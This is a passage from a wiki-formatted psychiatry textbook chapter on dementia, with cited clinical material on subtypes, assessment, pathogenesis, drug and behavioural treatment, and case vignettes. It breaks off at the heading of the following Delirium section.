Vascular dementia (VaD) is considered the third leading cause of dementia in the elderly, after DAT and Dementia with Lewy Bodies (Apostolova &amp; Cummings, 2008). However, some experts regard VaD as a heterogeneous syndrome, rather than a distinct disorder, in which the underlying cause is some type of cerebrovascular disease and the end result is dementia (Wright, 2007).  Several subtypes of VaD are recognized.  ''Multi-infarct dementia'' (MID)—the older term for VaD—involves multiple, relatively large infarctions, usually due to recurrent cerebral emboli originating from the heart, thromboembolic events, or atherosclerotic plaques. ''Single, strategically-placed infarct; lacunar state; ''and'' Binswanger&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (subcortical arteriosclerotic encephalopathy  (SAE) due to arteriosclerotic narrowing of deep penetrating white matter arterioles) are also considered VaD subtypes (see below).

In partial contrast to DAT, vascular dementia often shows a ''subcortical pattern'', with prominent psychomotor slowing, executive dysfunction, and mood changes. Speech difficulties (dysarthria) are common. Compared with DAT, memory deficits in VaD are more often related to ''retrieval'' than to initial ''encoding ''of memories; for example, the patient with VaD may be unable spontaneously to &quot;retrieve&quot; the name of a recently specified object (such as &quot;chair&quot;), but can do so if provided a clue (&quot;It rhymes with hair&quot;). In contrast to the course of DAT, VaD of the multi infarct variety may have a &quot;stuttering&quot; course, with a ''stepwise progression'' of cognitive deterioration, often accompanied by lateralizing neurological deficits (Sadock &amp; Sadock, 2007). SAE often has an insidious course that may be temporally difficult to distinguish from DAT. The neurological findings of multi-infarct dementia may include focal findings such as weakness, spasticity, rigidity, and extensor plantar reflex (positive Babinski sign). Compared with DAT, VaD has a higher incidence and greater severity of ''new-onset depression, ''especially in older individuals; this is sometimes referred to as &quot;vascular depression.&quot; Psychosis is also relatively common in VaD.

&lt;u&gt;'''Lewy Body Dementia'''&lt;/u&gt;

Barely recognized only 20 years ago, Dementia with Lewy Bodies (DLB) is now believed to be the second most prevalent dementia of old age, accounting for some 15-20% of cases (McKeith et al, 1996). Compared with DAT, memory impairment in DLB is less pronounced, but ''cognitive fluctuations'' are severe. Variability in the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s attention, alertness, and level of consciousness may reach the proportions of frank ''delirium'' (see below, Delirium). Recurrent ''visual hallucinations'' are also one of the hallmarks of DLB. DLB shares features with the dementia of ''Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (PD), and diagnosis is conventionally determined by the temporal pattern of motor symptoms: if these precede cognitive decline by more than 12 months, PD is diagnosed, whereas motor symptoms occurring within a year of cognitive decline would be diagnosed as DLB (Apostolova &amp; Cummings, 2008). ''Bradykinesia, rigidity, resting tremor, ''and'' gait disturbance ''are commonly seen in DLB, but cases of DLB without extrapyramidal symptoms are reported. Other clues to the presence of DLB include a history of falls or syncopal episodes; REM (rapid eye movement) sleep behavior disorder (such as violent behaviors during REM sleep); and extreme sensitivity to neuroleptics and atypical antipsychotics (Apostolova &amp; Cummings, 2008; Jacobson et al, 2007—see under Treatment).

&lt;u&gt;'''''Fronto-temporal dementia'''''&lt;/u&gt;

Fronto-temporal dementia (FTD) is actually a group of three related disorders, involving focal atrophy of the frontal and/or temporal lobes, accompanied by characteristic neurobehavioral impairments (Apostolova &amp; Cummings, 2008). So-called Frontal Variant FTD is also known as ''Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' and makes up the majority of FTD cases. (''Primary Progressive Aphasia'' and ''Semantic Dementia ''are less common FTD variants, and will not be discussed here).

Patients with Frontal Variant FTD typically do not complain of cognitive problems to the same extent as patients with DAT; rather, they show insidious but profound alterations in personality, social skills, and impulse control. However, neuropsychological testing does reveal deficits in verbal fluency, abstract thinking and planning, and verbal memory, often with sparing of ''visual ''memory. Compared to DAT patients, those with FTD usually have more mood disturbance, behavioral disinhibition, and abnormal motor behavior. Curiously, nearly half of all FTD patients—two years after diagnosis--will show one or more stereotyped or obsessive-compulsive behaviors. These may include hand clapping, hoarding, and repetitive or ritualistic  behaviors (Mendez &amp; Perryman, 2002; Apostolova &amp; Cummings, 2008). Twenty per cent of FTD patients may develop a form of Kluver-Bucy Syndrome (hyperorality, hypersexuality, and abnormal exploratory behavior) two years after diagnosis (Mendez &amp; Perryman, 2002).

''Case vignette: Mr. J. was a 57-year-old married white male, with a two-year history of marked &quot;change in personality&quot;, according to his wife. &quot;It&lt;nowiki&gt;’&lt;/nowiki&gt;s like night and day,&quot; she told the neurologist, &quot;compared to the way Fred used to be. He was the kindest, gentlest man I ever knew. Now, it&lt;nowiki&gt;’&lt;/nowiki&gt;s like Jekyll and Hyde—I&lt;nowiki&gt;’&lt;/nowiki&gt;m afraid to look at him cross-eyed, for fear he will scream at me, or worse.&quot; Mr. J. had always been a very empathic individual, but now seemed unconcerned with the wishes or needs of others. His hygiene and personal grooming had deteriorated over the past year, and he had begun to engage in bizarre rituals every morning; for example, counting to 100 before getting out of bed, then eating exactly six large muffins, without saying a word to his wife. Most of the time, Mr. J. seemed &quot;flat&quot; and apathetic; however, when his wife questioned any of his actions, he would shout at her or throw some object across the room.''

''A neurological evaluation found evidence of significant frontal lobe dysfunction and positive &quot;grasp reflex&quot;, but was otherwise within normal limits.''

Miscellaneous Dementia Syndromes

In addition to the aforementioned types of dementia, about 5% of patients will have dementia due to miscellaneous causes, including :  ''Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, Creutzfeld-Jakob Disease,  Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, HIV infection'', and other conditions''.  Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (HD)—an autosomal dominantly-transmitted, progressive disorder—has its peak onset in the fourth and fifth decade, though a smaller peak occurs in the 20s. The classic presentation for HD is a combination of ''chorea and dementia'', in the setting of a positive family history; however, the earliest presentation may be with ''affective'' or ''psychotic ''symptons (Lerner &amp; Riley, 2008). A &quot;tendency toward suicide&quot; in HD was recognized by Huntington himself, and suicidal ideation may be the presenting problem. ''Creutzfeld-Jakob Disease'' (CJD) is caused by an abnormal protein called a ''prion'', and typically presents as a rapidly-progressive dementia, accompanied by ataxia and multi-focal myoclonic jerks. A third of patients with CJD show a prodrome of fatigue, headache, insomnia, malaise, or depression (Apostolova &amp; Cummings, 2008). Dementia due to ''Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (PD) occurs in roughly 30% of patients with PD, with a larger percentage afflicted as age increases (Lerner &amp; Riley, 2008). However, cognitive symptoms can occur at any stage of PD, and are often characterized by slowed mentation (bradyphrenia), impaired visuo-spatial skills (such as facial recognition and operating objects in space) and executive dysfunction. Affective disturbance—especially depression—is very common in PD, and may be present in over 60% of cases. Anxiety is also commonly seen in PD, although less frequently than depression (Lerner &amp; Riley, 2008). Psychosis is also encountered in PD, usually related to dopaminergic effects of anti-Parkinsonian medication (Lerner &amp; Riley, 2008).

Cognitive deficits associated with ''HIV infection'' are considered part of a continuum, known as ''HIV-1-associated cognitive-motor complex (HCMC). ''Frank HIV dementia is the most serious form of HCMC, and occurs in roughly 30% of HIV-infected individuals (Fernandez &amp; Tan, 2008). The ''early'' clinical picture in HCMC is usually characterized by ''subcortical'' features (see Table 1), including reduced information processing speed; motor slowing or dyscoordination; and depressed mood. However, as the illness progresses, more classically &quot;cortical&quot; features may develop, including aphasia, agnosia, apraxia, and frontal lobe symptoms (Fernandez &amp; Tan, 2008). Behavioral disinhibition, mania, and psychotic features are often found in the later stages of HIV-associated dementia.

&lt;u&gt;'''''Assessment and Diagnostic Testing'''''&lt;/u&gt;

In addition to obvious abnormalities in the ''mental status exam'', the patient with dementia may show a variety of deficits on more sophisticated ''screening instruments'' and  ''neuropsychological assessments'', and on ''neuroimaging'' studies.

&lt;u&gt;'''''Prototypical mental status findings in dementia'''''&lt;/u&gt;

Considering the diverse subtypes of dementias, it is difficult to generalize about findings on mental status exam. Furthermore, the clinician must proceed with the caveat that a patient cannot be diagnosed with dementia, in the presence of active ''delirium'' (see Delirium, section  ). Nonetheless , if we &quot;average out&quot; the differences between cortical and subcortical dementia presentations, the following mental status exam could be considered typical of the patient with ''moderately severe dementia'':

''The patient appears alert, but apathetic and somewhat agitated, and is seen to be twisting her fingers through her hair. Her speech is fluent and well-articulated, but she uses many long, meaningless phrases (such as, &quot;The thing of it is, you see, I need the thing to be, you know, whatever.&quot;). She is oriented to year, but not the month or day. She recalls only 1 of three named items, after a three minute interval of distraction. She cannot remember the names of the college from which she graduated, and gave an incorrect response when asked, &quot;Who is the current president of the U.S.?&quot; When shown a picture of a cup, she calls it a &quot;vase&quot;, and identifies the examiner&lt;nowiki&gt;’&lt;/nowiki&gt;s stethoscope as a &quot;hearing aid&quot;. She is able to subtract 10 from 100 correctly, but cannot do serial 10&lt;nowiki&gt;’&lt;/nowiki&gt;s accurately (&quot;90, 85, 75, 65, 50, 40…&quot;). She produces a poorly-constructed drawing when asked to copy a cube, and her drawing of a clock reading &quot;ten past two&quot; was incorrect (with the big hand placed at the &quot;10&quot; position). When asked to interpret the proverb, &quot;The early bird catches the worm,&quot; her response is very concrete (&quot;The bird that gets up early will catch the worm.&quot;). When asked if she has any particular fears lately, she replies, &quot;I don&lt;nowiki&gt;’&lt;/nowiki&gt;t know what the neighbors think of me, but I know they steal from my bedroom.&quot;'' (Spitzer et al, 1994).

&lt;u&gt;'''''Screening instruments and neuropsychological assessments'''''&lt;/u&gt;

The most widely-used screening instrument for dementia is the Mini-Mental State Exam (MMSE) developed by Folstein ( Folstein et al, 1975), an 11-item test that evaluates orientation, registration, attention and calculation, recall, and language. The maximum score on the MMSE is 30 and—depending on age and education--a score of 28 or higher is usually considered &quot;normal.&quot; A &quot;low normal&quot; score (24 or higher) appears to predict development of dementia after three years (Braekhus et al, 1995). The MMSE does not specifically examine executive cognitive function. An expanded version of the MMSE (the 3MS) does include some executive function items, and may be more sensitive, specific and predictive of functional outcome than the MMSE (Grace et al, 1995). Neither the MMSE nor the 3MS is ideally suited to detecting features of &quot;milder&quot; or subcortical dementia, or detecting impairments in social or operational functioning. For HIV-related dementia, the HIV dementia scale or the Mental Alternation Test may be better alternatives (van Harten et al, 2004; Billick et al, 2001). More complete neuropsychological assessment of dementia usually includes use of the Wechsler Adult Intelligence Scale-III (WAIS-III), the Wechsler Memory Scale (WMS), the Rey Complex Figure, and Trail Making Test (Howieson &amp; Lezak, 2008), among others. These ancillary tests may be helpful in pinpointing specific functional impairments and their neuroanatomical correlates.

&lt;u&gt;'''''Neuroimaging studies'''''&lt;/u&gt;

Neither the ICD-10 nor the DSM-IV criteria for dementia require any corroborative evidence obtained from neuroimaging studies. Nevertheless, neuroimaging techniques such as magnetic resonance imaging (MRI) or postitron emission tomography (PET) may be helpful in clarifying diagnosis and ruling out other types of brain disease, such as normal pressure hydrocephalus. Indeed, the American Academy of Neurology recommends a non-contrast structural image (CT or MRI) in the initial evaluation of cognitive impairment (Apostolova &amp; Cummings, 2008). With DAT, global cerebral atrophy, especially in mesial temporal and parietal regions, is the usual finding on CT or MRI. On PET or SPECT (single-photon emission computed tomography), DAT patients usually show bilateral hypometabolism in mesial temporal and parietal regions. Recently, a novel radio-labeled PET imaging agent, ''18F-AV-45'', has been developed, and may eventually provide a practical approach for routine brain imaging for Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Association, 2008).

In dementia with Lewy Bodies (DLB), bilateral parietal and ''occipital ''hypoperfusion is seen. The latter helps distinguish DLB from DAT, and may explain the high prevalence of ''visual ''hallucinations in DLB. Structural imaging (CT, MRI) is not helpful in diagnosing DLB (Lerner &amp; Riley, p. 919). In frontotemporal dementia (FTD), the expected hypometabolism is seen in frontotemporal regions, using PET scanning (Apostolova &amp; Cummings, 2008). Structural imaging (such as MRI) shows distinct profiles for the three main subtypes of FTD, though some degree of frontal and/or temporal lobe involvement is seen in all three subtypes.

In vascular dementia, both CT and especially MRI can be useful in defining cortical and white matter abnormalities.  In multi-infract or lacunar states, evidence of prior infarct can be seen. In SAE, periventricular white matter abnormalities can frequently be seen, although limited periventricular abnormatilies just anterior or proximal to the lateral ventricle can also be seen in normal aging.  Periventricular abnormalities of greater size or distance from the ventricles, or extending into the centrum semiovale, are more likely to represent evidence of clinically significant disease.

Investigational Biomarkers

Given the uncertainties of early dementia diagnosis, there has been great interest in a &quot;blood test&quot; or other valid biomarker for DAT, the most common type of dementia. Recently, for example, researchers in Germany found differences in levels of ''CD-69'', a protein involved in white blood cell growth and production, in normal subjects versus those with DAT or Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s-related dementia (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Association, 2008). Irish researchers have focused on the enzyme ''beta-secretase'' (BACE1) activity in the brain. (BACE1 is one of two enzymes involved in the pathological processing of ''amyloid precursor protein'' (APP)—see below, under Pathogenesis).   High levels of BACE1 in the spinal fluid appear to be correlated with development of DAT. At present, these remain promising, but only investigational, techniques (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Association, 2008).

&lt;u&gt;'''''Pathogenesis of Dementias'''''&lt;/u&gt;

&lt;u&gt;'''''Biogenetic determinants and pathophysiology'''''&lt;/u&gt;

&lt;u&gt;'''''Dementia of the Alzheimer Type'''''&lt;/u&gt;

From the biogenetic standpoint,'' ''Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (DAT) appears to be of two main types: ''late-onset'' (sporadic) and ''early-onset''. When DAT begins after age 65 (late onset), its mode of inheritance appears to involve a constellation of genes, probably influenced by epigenetic factors (i.e., influences that do not change DNA sequence) such as diet and exercise. However, increasing age is the most important risk factor, with rates of DAT rising to 40% in those 85 years or older. Increasing age acts synergistically with the ''apolipoprotein E'' (APOE) ''gene polymorphism'' on chromosome 19. The APOE gene takes three major forms (''alleles''), termed ''ApoE2'', ''ApoE3'', and ''ApoE4''. APOE4 (E4) greatly increases the likelihood of late-onset DAT; i.e., individuals with two E4 genes develop DAT eight times more frequently than do those with no E4 gene. (Sadock and Sadock, 2007 p. 330; Apostolova &amp; Cummings, 2008). It appears that E4 promotes ''aggregation of amyloid β'' (Aβ), which leads to a variety of pathological changes in brain tissue (see below).

In ''early-onset'' DAT, instead of—or possibly in addition to—APOE4, three ''autosomal dominant mutations'' appear to be important: the APP gene mutation on chromosome 21; the presenilin-1-gene mutation on chromosome 14; and the presenilin-2 gene mutation on chromosome 1. As noted above, early-onset DAT may be associated with atypical features, as well as shorter survival time (Apostolova &amp; Cummings, 2008).

The classic pathological findings in DAT is the presence of ''senile plaques, neurofibrillary tangles, neuronal and synaptic loss'', and'' granulovascular degeneration of neurons'' (Sadock &amp; Sadock, 2007, p. 330). The pathophysiology of DAT is integrally related to the over-production or accumulation of ''amyloid β'' (Aβ). The &lt;nowiki&gt;’&lt;/nowiki&gt;amyloid cascade hypothesis&lt;nowiki&gt;’&lt;/nowiki&gt; of DAT posits that abnormal enzymatic processing of ''beta-amyloid precursor protein'' (βAPP) leads to overproduction of neurotoxic Aβ peptides. These abnormal peptides polymerize (form chains) and &quot;clump together&quot;, forming several types of destructive, extracellular inclusion bodies called ''plaques''. The first plaques appear in temporal-occipital association regions in patients with DAT. In addition, DAT may involve abnormal phosphorylation of a structural protein called ''tau'', which is involved in microtubulular transport—the intracellular &quot;highway system&quot; that transports vital constituents within neurons (Apostolova &amp; Cummings, 2008). In DAT, hyper-phosphorylated tau forms distructive intracellular inclusions called ''neurofibrillary tangles'' (NFTs).  Together, these plaques and tangles &quot;choke off&quot; normal neuronal function and neurotransmitter production in DAT, particularly affecting the production of ''acetylcholine'' (ACh) and norepinephrine. Degeneration of cholinergic neurons is present in the ''nucleus basalis of Meynert'' in persons with DAT, and low brain levels of ACh and choline acetyltransferase are also found. Cholinergic deficits provide the rationale for use of ''cholinesterase inhibitors'' in the treatment of DAT (see below, Treatment). In addition, overactivation of NMDA receptors by the excitatory neurotransmitter, ''glutamate'', is believed to play a role in DAT, and is the basis for one pharmacological treatment (see below re: memantine). Recently, it was discovered that elevated serum levels of ''amyloid β ''are associated with reduced cognitive function even in healthy older adults, similar to patterns observed in early DAT (Gunstad et al, 2008).

''Vascular Dementia ''VaD is caused by cumulative ischemic or hemorrhagic brain damage, usually secondary to cerebrovascular and cardiovascular pathology, and is often seen in association with hypertension, diabetes and hyperlipidemia (Apostolova &amp; Cummings, 2008). There are somewhat conflicting data regarding the contribution of the ApoE gene to the pathogenesis of VaD, but any such contribution appears smaller than that in DAT (Higuchi et al, 1996).

''Multi-infarct dementia'' (MID)—the older term for VaD—usually involves infarcts in the territory of the ''middle cerebral artery'' and surrounding (&quot;watershed&quot;) regions. The middle cerebral artery is the largest cerebral artery and is the vessel most commonly affected by cerebrovascular accident. It supplies most of the outer convex brain surface, nearly all the basal ganglia, and the posterior and anterior internal capsules (Slater, 2008). In VaD, infarcts are also seen in the basal ganglia and periventricular white matter.

Subacute Arteriosclerotic Encephalopathy (SAE) and ''Lacunar state'' both involve the small vessels of the brain. SAE is caused by thickening and narrowing (arteriosclerosis) of arteries that feed subcortical areas of the brain. SAE produces widespread, microscopic areas of damage to the deep layers of ''white matter.'' (NINDS, 2008). ''Lacunar state'' (lacunar disease) is due to occlusion of small, penetrating cerebral arteries, leading to  extremely small but deep infarctions (''lacunes''). Sometimes, these lacunes are so small as to produce no obvious deficits, or only pure motor or sensory deficits (Robinson &amp; Starkstein, p. 707). Lacunar state is often associated with hypertension and/or diabetes. The cavitary lesions (lacunae) characteristic of this condition are often found in the internal capsule, deep grey matter nuclei, and white matter.

''Cerebral autosomal dominant arteriopathy with subcortical infarcts and leucoencephalopathy'' (CADASIL) is a rare, hereditary type of VaD that affects small blood vessels in the brain. An abnormality in the muscle cells surrounding these blood vessels gradually destroys the blood vessel cells. This may lead to migraines, emotional disturbance, stroke-like episodes, dementia, and other impairments (CADASIL Foundation, 2008).  CADASIL involves mutations of the Notch 3 gene on chromosome 19 (Joutel et al, 1996). There are also a growing number of genetically uncharacterized but familial small vessel diseases (Low et al, 2007).

''Dementia with Lewy Bodies (DLB)'' does exist in genetic forms, including some autosomal dominant forms (Lerner &amp; Riley, p. 919).  There is significant pathophysiological overlap between DLB and Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (PD), on the one hand; and DLB and SDAT, on the other. Thus, ''alpha-synuclein'' is a protein that appears to modulate synaptic transmission, and constitutes the major component of ''Lewy bodies''. These structures are the pathological hallmark of both PD and DLB, whether of a sporadic or familial origin (Lerner &amp; Riley, p. 914).

There is considerable overlap between DLB and DAT. For example, ''neuritic plaques'' and ''neurofibrillary tangles'' are seen in autopsy studies of both DAT and DLB, though fewer neurofibrillary tangles are found in DLB (Samuel et al, 1997). Moreover, ''amyloid β'' (Aβ) pathology—one of the hallmarks of DAT—is often seen in DLB. Indeed, there is an interesting synergy between pathophysiological elements of DLB and DAT. For example, alpha- synuclein is a potent inducer of tau fibrillization, while Aβ  has been shown to promote Lewy body pathology in animal models (Giasson et al, 2003; Masliah et al, 2001).

''Fronto-temporal dementia - ''There appears to be a strong genetic loading in FTD. About 40% of FTD patients have a family history of a similar disorder in close relatives, and in the vast majority of cases, there is an autosomal dominant inheritance pattern. Autosomal dominant mutations in the ''tau'' gene on chromosome 17 have been discovered in FTD, and—like DAT-- FTD is generally considered a &quot;tauopathy.&quot; However, &quot;tau-negative&quot; forms of FTD have been described, including one form that often presents with concomitant ''amyotrophic lateral sclerosis ''(ALS) (Apostolova &amp; Cummings, 2008; Lantos &amp; Cairns, 2001).

Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (frontal variant FTD) produces striking frontal, temporal, or combined (fronto-temporal) atrophy. Microscopically, the hallmark are  spherical, tau-based inclusion bodies, termed ''Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s bodies'', which may be seen in neurons and glial cells. Neuronal loss and swelling are also commonly seen in Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease. In tau-negative forms of FTD, neuronal loss, gliosis, and microvacuolation are the sole microscopic findings.

&lt;u&gt;'''''Ethno-cultural and racial factors in dementia'''''&lt;/u&gt;

Ethnic, cultural, and racial factors play a role in the assessment of dementia and, to some extent, on its course and outcome. For example, most diagnostic tests for dementia are based on cognitive assessments not yet validated for various ethnic groups. Moreover, emigration of some ethnic groups may affect dementia prevalence, as demonstrated by higher rates of dementia among Japanese-Americans than among Japanese cohorts in Japan (Iliffe &amp; Manthorpe, 2004). Ethnic and cultural factors may also affect caregiver attitudes and behavior. For example, Latina dementia caregivers may delay institutionalization significantly longer than female Caucasian caregivers, perhaps reflecting more tolerant Latino cultural attitudes toward caregiving (Mausbach et al, 2004). Similarly, Shaw et al (1997) found lower rates of depressive symptoms in Chinese, as compared with American, caregivers of demented patients, possibly reflecting greater acceptance of traditional family roles among the Chinese subjects. Finally, ethnicity and race may play a role even in the symptomatic expression of dementia, with different ethnic and racial groups showing varying rates of aggressive behaviors, wandering, and hallucinations (Sink et al, 2004).

&lt;u&gt;'''''Treatment of Dementias'''''&lt;/u&gt;

&lt;u&gt;'''''Pharmacotherapy'''''&lt;/u&gt;

By far the most experience with pharmacotherapy has been in patients with DAT, and our discussion necessarily focuses on this condition. The mainstay of drug therapy in dementia is a group of agents called ''cholinesterase inhibitors'' (CIs), including donepezil, galantamine, and rivastigmine. (Another CI, tacrine, is rarely used nowadays in most industrialized countries, owing to its hepatotoxic effects). Comprehensive discussion of these agents may be found in Jacobson et al, 2007. All CIs act to inhibit the enzyme ''acetylcholinesterase'', which metabolizes the neurotransmitter, acetylcholine. Rivastigmine also inhibits butyrylcholinesterase, and galantamine is an allosteric modifier of the nicotinic acetylcholine receptor. There is no convincing, randomized, controlled evidence showing any one of these drugs as markedly superior to the others. Indeed, the efficacy of this group of agents appears to be modest-to-moderate, with most studies of DAT finding that the CIs mainly slow the rate of cognitive decline and/or delay nursing home placement.  One meta-analysis of 13 randomized, double blind, placebo controlled trials demonstrated that 6-12 months of treatment with donepezil, galantamine or rivastigmine in mild, moderate or severe DAT produced about a 3 point drop in scores on the 70-point ADAS-Cog Scale. Benefits were also seen on measures of activities of daily living and behavior. But as the authors note, &quot;none of these treatment effects (is) large.&quot; (Birks, 2006). The other drug used in most countries for DAT is ''memantine'', which blocks the action of glutamate at the NMDA receptor, under conditions of excessive glutamate activity (Jacobson et al, 2007). This is thought to slow neurodegeneration in DAT, and there is evidence of memantine&lt;nowiki&gt;’&lt;/nowiki&gt;s benefits in moderate-to-severe DAT. In some instances, memantine may be combined with one of the CIs, but long-term data on outcome are few.

Although atypical ''antipsychotics'' are often used—and sometimes, overused—in patients with DAT, they are not without risk in dementia-prone populations, particularly when ''vascular risk factors'' are present. In the U.S., the Food &amp; Drug Administration (FDA) issued, in June 2008, an advisory to physicians, stating the following (FDA, Alert, 6/16/08):

&lt;nowiki&gt;*&lt;/nowiki&gt;  Elderly patients with dementia-related psychosis treated with conventional or atypical antipsychotic drugs are at an increased risk of death.

* Antipsychotic drugs are not approved for the treatment of dementia-related psychosis.  Furthermore, there is no approved drug for the treatment of dementia-related psychosis.  Healthcare professionals should consider other management options.

Physicians who prescribe antipsychotics to elderly patients with dementia-related psychosis should discuss this risk of increased mortality with their patients, patients&lt;nowiki&gt;’&lt;/nowiki&gt; families, and caregivers.

Notwithstanding these serious concerns, some patients with DAT and psychotic features and/or severe behavioral disturbance (e.g., extreme agitation or aggressive violence) may require and benefit from low doses of atypical antipsychotics; e.g., risperidone 0.5 mg/day or olanzapine 5 mg/day (Alexopoulos et al, 2004).  However, attempts at behavioral modification (see below) and alternative therapies (such as the SSRI ''citalopram'') should be considered (Pollock et al, 2007). As a recent review by Ellison (2008) put it:

&quot;…several of the atypical antipsychotics remain reasonable choices when used in patients whose vascular risk factors do not outweigh their behavioral treatment needs. The atypical antipsychotics have not been proved to control agitation over an extended period of time and should be used at the lowest effective doses and for the shortest interval necessary, with sufficient psychoeducation and disclosure of risks to caregivers and relatives.&quot;

Treatment of vascular dementia (VaD) should first focus on mitigation of known risk factors, such as hypertension, diabetes, atrial fibrillation, and hyperlipidemia. Studies regarding use of CIs for vascular dementia are plagued by methodological problems, such as inclusion of those whose dementia probably involves some DAT-type pathology and cholinergic system dysfunction; nonetheless, there is modest and growing evidence that the CIs may be helpful in subgroups of patients with VaD. Similarly, Dementia with Lewy Bodies (DLB) also involves reduction of brain acetylcholine—perhaps surpassing those seen in DAT--and the CIs may sometimes be useful in DLB (Jacobson et al, 2007; ). Patients with DLB are exquisitely sensitive to the extrapyramidal side effects of antipsychotics, and both typical and atypical agents (with the possible exception of clozapine) are generally to be avoided in DLB patients.

&lt;u&gt;'''''Psychosocial and behavioral interventions'''''&lt;/u&gt;

Whenever possible, the clinician should initiate non-pharmacological interventions when managing behavioral disturbances in patients with dementia. Such behavioral approaches are aimed at ameliorating physical, environmental and psychosocial stressors that may lead to agitation, pacing, aggression, and related behavioral disturbances (Salzman et al, 2008). For example, dysfunctional verbal and physical behaviors—such as repetitive shouting, pacing, punching, etc.—may reflect unrecognized pain, loneliness, depression, boredom, or other social stressors. A variety of behavioral interventions may be helpful in this context; e.g., structured socialization, &quot;pet therapy&quot;, viewing family videotapes, and training programs for family caregivers. It is also important to review the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s medical status and medications, since adverse drug effects or interactions may sometimes contribute to confusion and agitation (Jacobson et al, 2007; Salzman et al, 2008). There are relatively few well-controlled studies of non-pharmacological interventions in dementia; nevertheless, a number of promising investigational approaches are under investigation, including aroma therapy and music therapy (Raglio et al, 2008).

&lt;u&gt;'''''Special Populations'''''&lt;/u&gt;

There are several subgroups of demented patients who merit special attention and interventions. Patients with ''HIV-related dementia'' in the late stages, for example, may exhibit behavioral disinhibition, mania, and psychotic features, such as delusions and hallucinations. Primary treatment of HIV/AIDs is aimed at suppression of viral load by means of anti-retroviral therapies. Some evidence suggests that the nucleoside analog reverse transcriptase inhibitor (NRTI) ''zidovudine'' (also known as AZT) may attenuate the symptoms of HIV-related dementia and neurological impairment in some patients; however, zidovudine and related agents may themselves provoke ''neuropsychiatric complications'', such as depersonalization, mania, and delirium (Fernandez &amp; Tan, 2008). Cognitive functioning in HIV dementia patients may be improved by methylphenidate; psychotic symptoms may respond to atypical antipsychotics, such as risperidone or olanzapine. Depression in HIV/AIDS is not uncommon, but may stem from a complex mix of direct effects of HIV on the CNS, and psychosocial factors.

Antidepressants such as citalopram and escitalopram may be useful, but this patient population is particularly susceptible to drug-related side effects and interactions. Thus, any pharmacotherapy aimed at neuropsychiatric symptoms must be very carefully monitored in this population (Fernandez &amp; Tan, 2008).

As noted above, ''Dementia with Lewy Bodies'' (DLB) poses particular management problems. Psychotic symptoms, including visual hallucinations, are a central feature of DLB, and the sensitivity of these patients to antipsychotics makes treatment especially challenging. Cholinesterase inhibitors, such as rivastigmine, may ameliorate some neuropsychiatric symptoms in DLB patients, including hallucinations, paranoid delusions, apathy, aggression, and agitation (Simard &amp; van Reekum, 2004; Apostolova &amp; Cummings, 2008). If an antipsychotic must be used in DLB with psychosis, classic neuroleptics should be avoided; initiating treatment with very low doses of quetiapine or clozapine is sometimes warranted (Jacobson et al, 2007).

''Depression'' as a feature of dementia represents a diagnostic and treatment challenge. As noted earlier, depression is commonly seen in patients with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, DAT, and LBD, as well as in those with a history of stroke or other form of VaD. Depression may represent a prodrome to dementia or a feature of established dementia. The recently described ''amyloid-associated depression'' may represent such a prodome in DAT (Qiu et al 2008).  ''Vascular depression'' (Sneed et al, 2008, Alexopolous, 2006) may present as new-onset of depressive illness in those affected by diffuse or focal vascular lesions, and is increasingly recognized in older individuals. Conversely, the &quot;dementia of depression&quot; (formerly called ''depressive pseudodementia'') is a reversible cognitive impairment directly related to the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s mood disorder. Features such as ''excessive guilt, low self-esteem, self-loathing, or persistent suicidal ideation'', as well as ''delayed responses to cognitive questions,'' are useful &quot;red flags&quot; for the presence of depression in dementia. The Cornell Scale for Depression in Dementia may be helpful in detecting this problem. Depressed patients with dementia often respond to lower doses of antidepressants (such as citalopram or sertraline) than do non-demented depressed patients (Jacobson et al, 2007).

''Delirium'' is a common complication of both HIV-related dementia and DLB, and is discussed in the section on Delirium. Co-morbid dementia and delirium is also discussed in the section on Delirium.

''Case Vignette: Mr. J. was a 78-year-old nursing home patient with dementia of the Alzheimer type (DAT). The staff were concerned and distressed by Mr. J&lt;nowiki&gt;’&lt;/nowiki&gt;s frequent &quot;moaning&quot; or &quot;yelling&quot;, particularly in the evening, and believed these behaviors were adversely affecting the other residents of the home. Mr. J. was prescribed risperidone 1.0  mg at h.s. His yelling diminished after only two days of treatment. However, he developed significant orthostatic  hypotension and akathisia, and continued to &quot;moan&quot; nearly every night. A comprehensive medical evaluation revealed that Mr. J. suffered from severe osteoarthritis, which was worsened with attempts by the &quot;night shift&quot; nurses to reposition Mr. J. in his bed. A combination of acetaminophen and local heat application led to considerable relief and marked reduction in Mr. J&lt;nowiki&gt;’&lt;/nowiki&gt;s verbal outbursts.''

''Risperidone was reduced to 0.25 mg at h.s., with significant improvement in Mr. J&lt;nowiki&gt;’&lt;/nowiki&gt;s akathisia and hypotension''.

&lt;u&gt;'''''DELIRIUM'''''&lt;/u&gt;

&lt;u&gt;'''''Phenomenology (Characteristic Features of Delirium)'''''&lt;/u&gt;

